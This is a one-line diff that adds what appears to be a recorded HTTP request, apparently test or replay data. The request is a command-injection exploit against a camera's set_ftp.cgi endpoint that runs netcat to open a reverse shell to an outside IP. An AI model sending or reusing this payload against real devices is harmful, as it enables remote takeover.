@@ -1,0 +1,1 @@
+stream = [('in', b'GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+107.189.30.247+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1\x0a\x0a')]
